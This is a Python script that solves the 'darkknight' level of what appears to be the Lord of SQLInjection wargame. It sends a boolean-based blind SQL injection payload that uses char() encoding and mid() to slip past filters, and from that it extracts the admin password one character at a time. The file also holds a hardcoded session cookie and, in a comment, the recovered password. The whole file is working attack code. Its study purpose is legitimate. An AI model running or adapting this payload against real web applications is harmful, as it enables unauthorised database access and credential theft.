import requests



def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	for i in range(1,9):
		print("progress : " + str(i))
		for guess in range(48,127):
			print("matching with : " + chr(guess))
			URL="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=-1 or id like char(97,100,109,105,110) and mid(pw,"+str(i)+",1)like char("+str(guess)+")"
			response = requests.get(URL, cookies=cookies)
			if "Hello admin" in response.text:
				print(str(i)+" number's password : " + chr(guess))
				password+=chr(guess)
				break
			if guess == 126:
				password+=" "

	print("admin's Password : " + password)
 
if __name__ == "__main__":
	print("Start Program")
	blindi()	
	# password 0B70EA1F
